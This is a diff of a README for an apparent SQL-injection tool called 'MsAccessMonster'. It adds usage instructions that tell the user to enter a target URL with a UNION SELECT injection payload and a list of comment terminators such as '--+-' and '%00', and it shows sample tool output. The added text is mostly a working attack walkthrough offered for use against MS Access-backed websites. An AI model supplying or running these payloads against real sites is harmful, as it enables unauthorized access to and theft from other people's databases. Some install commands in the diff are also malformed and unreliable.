@@ -23,7 +23,7 @@ git clone https://github.com/EverythingVulnerable/MsAccessMonster
 sudo su
 ```
 ```
-apt update && apt upgrade -y
+apt-get update && apt upgrade -y
 ```
 ```
 apt-get install python3 && python3-pip && git
@@ -32,14 +32,30 @@ apt-get install python3 && python3-pip && git
 git clone https://github.com/EverythingVulnerable/MsAccessMonster
 ```
 
-### Running commands
+### Running commands ( for every device )
 ```
+cd MsAccessMonster
+```
+```
+python3 ms.py
+```
+Then, you will be asked for a Ms Access Vulnerable Site. Give it like this,
+```
+https://www.everythingvuln1.com/vuln.php?id=1 and 0 union select 1,2,3,4 from
+```
+Or,
+```
+https://www.everythingvuln1.com/vuln.php?id=1'and 0 union select 1,2,3,4 from
+```
+Then, you will be asked to give the comment of the query. This can be anything. Depends on the website. Such as,
 
 ```
+--
+--+-
+%00
+;%00
 ```
-
+Give the perfect comment and hit enter and wait for the response.
 ```
+[$] Site link: https://www.everythingvuln1.com/vuln.php?id=1 and 0 union select 1,2,3,4 from ..... %00
 ```
-
-```
-
